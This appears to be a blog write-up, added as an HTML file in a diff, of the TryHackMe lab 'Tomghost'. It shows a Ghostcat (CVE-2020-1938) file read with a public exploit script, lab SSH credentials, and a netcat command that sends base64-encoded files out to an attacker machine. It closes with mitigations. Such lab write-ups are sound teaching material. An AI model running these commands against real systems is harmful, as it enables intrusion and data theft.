@@ -1,0 +1,134 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Tomghost — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="Tomcat 9.0.30 with AJP exposed on port 8009 is vulnerable to Ghostcat (CVE-2020-1938) — an unauthenticated file read via the AJP protocol. Reading…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/tomghost.html">
+<meta property="og:title" content="Tomghost — TryHackMe writeup">
+<meta property="og:description" content="Tomcat 9.0.30 with AJP exposed on port 8009 is vulnerable to Ghostcat (CVE-2020-1938) — an unauthenticated file read via the AJP protocol. Reading…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/tomghost.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Tomghost — TryHackMe writeup","description":"Tomcat 9.0.30 with AJP exposed on port 8009 is vulnerable to Ghostcat (CVE-2020-1938) — an unauthenticated file read via the AJP protocol. Reading…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-20","url":"https://thecyberfarhan.github.io/writeups/tomghost.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/tomghost.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Tomghost</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 20, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>Tomcat 9.0.30 with AJP exposed on port 8009 is vulnerable to Ghostcat (CVE-2020-1938) — an unauthenticated file read via the AJP protocol. Reading <code>/WEB-INF/web.xml</code> leaked SSH credentials directly in the file's description tag. From there, two encrypted files (a PGP-encrypted credential and a GPG private key) were exfiltrated via base64-over-netcat, the GPG passphrase cracked with John, and the decrypted credential gave SSH access to a second user. <code>sudo zip</code> with the classic symlink/shell trick finished the job. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐍 ajpShooter.py</span><span class="chip">🔑 SSH</span><span class="chip">🔓 gpg2john + John the Ripper</span><span class="chip">🔐 GPG</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Tomghost</strong> — a box built entirely around one specific, well-documented CVE: Ghostcat. Apache Tomcat's AJP connector, when left exposed without authentication, allows an attacker to read any file within the web application context — no credentials required. This box demonstrates exactly how dangerous that primitive is: one file read exposes a username and password pair, planted directly in a configuration file by the box author as the "treasure" Ghostcat reveals. From there it's a fairly standard chain of file exfiltration, GPG cracking, and a <code>sudo zip</code> escalation that's been a GTFOBins staple for years.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What the AJP (Apache Jserv Protocol) is and why Ghostcat (CVE-2020-1938) is dangerous</li><li>How to exfiltrate binary files over a netcat connection using base64 encoding</li><li>What GPG/PGP encryption is and how <code>gpg2john</code> enables cracking encrypted private keys</li><li>What GTFOBins documents about <code>zip</code>'s <code>-T -TT</code> test-and-execute flags</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<pre><code>rustscan -a 10.49.139.97 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</td></tr><tr><td>53/tcp</td><td>tcpwrapped</td><td>unidentified</td></tr><tr><td>8009/tcp</td><td>AJP</td><td>Apache Jserv Protocol 1.3</td></tr><tr><td>8080/tcp</td><td>HTTP</td><td>Apache Tomcat 9.0.30</td></tr></tbody></table>
+<p>The pairing of <strong>AJP on 8009</strong> and <strong>Tomcat 9.0.30</strong> is the entire story of this box. Tomcat 9.0.30 falls within the vulnerable version range for Ghostcat.</p>
+<h3>Web Directory Enumeration</h3>
+<p>Feroxbuster on port 8080 returns the standard Tomcat installation — documentation, example apps, the manager interface (403 forbidden, as expected without credentials). Nothing custom was deployed. The vulnerability isn't in any web content; it's in the AJP connector itself.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~8 mins into the box)</p>
+<h3>Ghostcat — CVE-2020-1938</h3>
+<p><strong>What is Ghostcat?</strong> The AJP protocol is designed for communication *between* a web server (like Apache HTTPD) and Tomcat's servlet container — it's meant to be used internally, not exposed to the public internet. When AJP is reachable externally and Tomcat's <code>requestedSessionId</code> and file-read attributes aren't properly restricted, an attacker can request arbitrary files from within the web application's <code>WEB-INF</code> directory — including configuration files — entirely without authentication. This is classified as a file read/inclusion vulnerability, and depending on the application, it can be escalated to remote code execution if file upload functionality also exists.</p>
+<p class="aside">Downloading the public Ghostcat exploit tool:</p>
+<pre><code>wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py</code></pre>
+<p class="aside">Reading <code>WEB-INF/web.xml</code> via the AJP connector:</p>
+<pre><code>python3 ajpShooter.py http://10.49.139.97 8009 /WEB-INF/web.xml read</code></pre>
+
+<pre><code>&lt;web-app ...&gt;
+  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
+  &lt;description&gt;
+     Welcome to GhostCat
+        skyfuck:8730281lkjlkjdqlksalks
+  &lt;/description&gt;
+&lt;/web-app&gt;</code></pre>
+<p>Credentials sitting directly inside the application's deployment descriptor — about as deliberate a placement as a CTF box can manage. Username <code>skyfuck</code>, password <code>8730281lkjlkjdqlksalks</code>.</p>
+<h3>Credentials Found</h3>
+<table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>skyfuck</code></td><td><code>8730281lkjlkjdqlksalks</code></td><td><code>WEB-INF/web.xml</code> via Ghostcat</td></tr></tbody></table>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~12 mins into the box)</p>
+<pre><code>ssh skyfuck@10.49.139.97
+# Password: 8730281lkjlkjdqlksalks</code></pre>
+
+<pre><code>skyfuck@ubuntu:~$ ls
+credential.pgp  tryhackme.asc
+
+skyfuck@ubuntu:~$ ls /home
+merlin  skyfuck
+
+skyfuck@ubuntu:~$ cat /home/merlin/user.txt
+THM{GhostCat_1s_so_cr4sy}</code></pre>
+<p>The user flag is readable directly without any further escalation — <code>merlin</code>'s home directory permissions allow it. The two files in <code>skyfuck</code>'s home (<code>credential.pgp</code> and <code>tryhackme.asc</code>) are the path forward to a proper shell as <code>merlin</code>.</p>
+<h3>File Exfiltration via Base64 + Netcat</h3>
+<p>There's no SCP/SFTP convenience here — files are pulled out manually by base64-encoding them on the target and piping the output to a netcat connection back to the attacking machine.</p>
+<p class="aside">On the target, encoding and sending each file:</p>
+<pre><code>base64 credential.pgp | nc 192.168.134.217 4444</code></pre>
+<p class="aside">On the attacker, listening and capturing:</p>
+<pre><code>nc -lnvp 4444 &gt; credential.pgp.b64</code></pre>
+<p>Repeated for <code>tryhackme.asc</code>. Both files decoded locally:</p>
+<pre><code>base64 -d credential.pgp.b64 &gt; credential.pgp
+base64 -d tryhackme.asc.b64 &gt; tryhackme.asc</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>Ghostcat (CVE-2020-1938)</strong> via <code>ajpShooter.py</code> → read <code>WEB-INF/web.xml</code> → <code>skyfuck</code> credentials</li><li><strong>SSH as <code>skyfuck</code></strong> → user flag readable directly; two encrypted files found</li><li><strong>Base64 + Netcat exfiltration</strong> → <code>credential.pgp</code> and <code>tryhackme.asc</code> retrieved locally</li><li><strong>gpg2john + John</strong> → GPG passphrase <code>alexandru</code></li><li><strong>GPG decrypt</strong> → <code>merlin</code>'s SSH credentials</li><li><strong>SSH as <code>merlin</code></strong> → <code>sudo zip</code> GTFOBins → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>GPG Import "Operation Cancelled"</h3>
+<p>The first <code>gpg --import tryhackme.asc</code> attempt failed with "Operation cancelled" — GPG's pinentry agent prompted for the passphrase in a way that got dismissed (likely a terminal/TTY interaction issue rather than a wrong passphrase). Simply re-running the exact same import command a second time succeeded cleanly. No configuration change was needed — just a retry.</p>
+<h3>Searching for a Public Exploit for Tomcat 9.0.30 Directly</h3>
+<p>Initial searches focused on Tomcat-version-specific RCEs rather than the AJP connector. Tomcat 9.0.30 itself has no major unauthenticated RCE in that exact version. The actual vulnerability (Ghostcat) is a connector-level issue affecting *any* Tomcat version with AJP exposed, regardless of the HTTP-facing version number — a reminder to check exposed *protocols*, not just the headline web server version.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Ghostcat (CVE-2020-1938) — AJP exposed without auth</td><td class="sev-critical">Critical</td><td>Update Tomcat to a patched version (9.0.31+, 8.5.51+, 7.0.100+); disable the AJP connector entirely if not needed; if required, bind it to localhost only and set <code>requiredSecret</code></td></tr><tr><td>Credentials embedded in <code>web.xml</code> description tag</td><td class="sev-critical">Critical</td><td>Never store credentials in application configuration files, especially ones potentially exposed via file-read vulnerabilities</td></tr><tr><td>Sensitive encrypted files left in a user's home directory</td><td class="sev-medium">Medium</td><td>Restrict home directory permissions; don't leave decryption-pending sensitive files lying around indefinitely</td></tr><tr><td>Weak GPG key passphrase (<code>alexandru</code>) crackable via rockyou.txt</td><td class="sev-high">High</td><td>Use a long, randomly generated passphrase for any GPG/PGP key</td></tr><tr><td><code>sudo zip</code> with NOPASSWD</td><td class="sev-critical">Critical</td><td>Remove <code>zip</code> from <code>sudoers</code>; check every binary against GTFOBins before granting unrestricted <code>sudo</code> access</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Always check exposed protocols, not just the headline application version — Ghostcat is a connector-level vulnerability that exists independently of which Tomcat version is serving HTTP traffic. AJP was never meant to face the public internet; its mere presence on an externally reachable port is itself the vulnerability, regardless of what patches are applied elsewhere.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Check for AJP (port 8009) immediately whenever Tomcat is identified, before searching for version-specific Tomcat RCEs — Ghostcat affects a much wider range of deployments than any single CVE tied to a specific Tomcat release, and it's usually the faster path in.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/tomghost_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
